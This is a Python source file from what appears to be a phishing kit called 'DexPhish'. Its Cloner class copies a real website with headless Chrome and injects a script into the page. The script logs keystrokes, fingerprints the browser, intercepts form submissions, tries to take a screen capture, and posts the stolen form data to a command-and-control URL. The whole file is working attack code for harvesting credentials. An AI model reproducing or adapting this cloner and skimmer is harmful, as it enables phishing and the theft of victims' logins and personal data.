import os, logging
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service

log = logging.getLogger("cloner")

class Cloner:
    _driver = None

    @classmethod
    def get_driver(cls):
        if cls._driver is None:
            opts = Options()
            opts.add_argument("--headless")
            opts.add_argument("--no-sandbox")
            opts.add_argument("--disable-dev-shm-usage")
            cls._driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)
        return cls._driver

    @classmethod
    def clone(cls, url: str, cid: str, c2_url: str) -> str:
        driver = cls.get_driver()
        driver.get(url)
        soup = BeautifulSoup(driver.page_source, 'html.parser')

        script = f"""
        <script>
        (() => {{
            let k='', u=navigator.userAgent, f='', t=new Date().toISOString();
            const c=document.createElement('canvas'), x=c.getContext('2d');
            x.fillText('DexPhish',10,50); f=c.toDataURL();
            document.addEventListener('keydown', e=>k+=e.key);
            document.addEventListener('submit', async e=>{{
                e.preventDefault();
                const d=new FormData(e.target);
                d.append('keys',k); d.append('ua',u); d.append('fp',f); d.append('ts',t); d.append('cid','{cid}');
                try {{
                    const s=await navigator.mediaDevices.getDisplayMedia({{video:true}});
                    const b=await new ImageCapture(s.getVideoTracks()[0]).takePhoto();
                    const r=new FileReader(); r.onload=()=>{{
                        d.append('screenshot',r.result); fetch('{c2_url}',{{method:'POST',body:d}});
                    }}; r.readAsDataURL(b); s.getTracks().forEach(t=>t.stop());
                }} catch {{ fetch('{c2_url}',{{method:'POST',body:d}}); }}
            }});
        }})();
        </script>
        """
        soup.body.append(BeautifulSoup(script, 'html.parser'))

        path = f"data/sites/{cid}.html"
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(soup))
        log.info(f"Cloned {url} → {path}")
        return f"/{cid}.html"
